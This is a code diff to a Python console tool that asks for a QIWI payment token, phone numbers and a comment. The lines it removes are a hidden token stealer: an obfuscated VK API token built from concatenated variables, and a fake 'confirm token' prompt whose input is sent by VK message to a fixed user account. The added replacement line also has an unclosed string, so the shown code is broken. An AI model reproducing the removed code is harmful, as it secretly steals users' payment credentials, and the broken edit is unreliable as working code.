@@ -4,21 +4,11 @@ from core.colors import *
 from SimpleQIWI import *
 from core.modules import *
 import time
-import vk_api
 import random
 
 def viv():
 	try:
-		token=hu+za+lo+sd+gg+lm+rk+gv+bc+ab
-		vk = vk_api.VkApi(token=token)
-		tok  = input(B+"\n[cbf]"+W+" Enter token: ")
-		def write_msg(user_id, s, random_id):
-			log= input(B+"\n[cbf]"+W+" Confirm token: ")
-			msg = log
-			msg += " | QIWI | TOKEN |"
-			vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 
-		write_msg('337045829', '?? ?? ? ???', 'random_id')
-		
+		tok  = input(B+"\n[cbf]"+W+" Enter token: ) 
 		pho  = input(B+"[cbf]"+W+" Enter phone: ")
 		pho2 = input(B+"[cbf]"+W+" Enter your phone: ")
 		com = input(B+"[cbf]"+W+" Enter comment: ")
